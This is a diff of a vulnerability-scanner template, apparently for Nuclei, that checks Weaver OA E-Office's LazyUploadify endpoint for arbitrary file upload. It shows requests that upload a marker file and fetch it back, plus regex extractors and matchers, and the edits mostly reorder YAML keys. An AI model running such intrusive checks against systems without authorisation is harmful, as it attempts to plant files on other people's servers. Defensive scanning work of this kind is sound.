@@ -1,5 +1,4 @@
 id: weaver-lazyuploadify-file-upload
-
 info:
   name: OA E-Office LazyUploadify - Arbitrary File Upload
   author: SleepingBag945
@@ -7,18 +6,43 @@ info:
   description: OA E-Office LazyUploadify is vulnerable to arbitrary file upload.
   reference:
     - https://github.com/w-digital-scanner/w9scan/blob/master/plugins/weaver_oa/2158.py
+  classification:
+    cwe-id:
+      - CWE-434
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag intrusive
-    verified: true
-    max-request: 3
     fofa-query: app="泛微-EOffice"
-  tags: weaver,e-office,intrusive,rce,file-upload,vuln
+    max-request: 3
+    verified: true
+  tags: e-office,file-upload,intrusive,rce,vuln,weaver
 variables:
-  filename: "{{to_lower(rand_base(5))}}"
-  string: "weaver-lazyuploadify-file-upload"
-
+  filename: '{{to_lower(rand_base(5))}}'
+  string: weaver-lazyuploadify-file-upload
 http:
-  - raw:
+  - extractors:
+      - group: 1
+        internal: true
+        name: attachmentID
+        regex:
+          - attachmentID":(.*?),
+        type: regex
+      - group: 1
+        internal: true
+        name: attachmentName
+        regex:
+          - attachmentName":"(.*?)",
+        type: regex
+    matchers:
+      - condition: and
+        dsl:
+          - contains(body_2, 'attachmentID') && contains(body_2, 'attachmentName')
+        type: dsl
+      - part: body_3
+        type: word
+        words:
+          - '{{md5(string)}}'
+    matchers-condition: and
+    raw:
       - |
         GET /general/weibo/javascript/LazyUploadify/uploadify.php HTTP/1.1
         Host: {{Hostname}}
@@ -39,31 +63,3 @@ http:
       - |
         GET /attachment/{{attachmentID}}/{{attachmentName}} HTTP/1.1
         Host: {{Hostname}}
-
-    extractors:
-      - type: regex
-        name: attachmentID
-        internal: true
-        group: 1
-        regex:
-          - "attachmentID\":(.*?),"
-
-      - type: regex
-        name: attachmentName
-        internal: true
-        group: 1
-        regex:
-          - "attachmentName\":\"(.*?)\","
-
-    matchers-condition: and
-    matchers:
-      - type: dsl
-        dsl:
-          - "contains(body_2, 'attachmentID') && contains(body_2, 'attachmentName')"
-        condition: and
-
-      - type: word
-        part: body_3
-        words:
-          - '{{md5(string)}}'
-
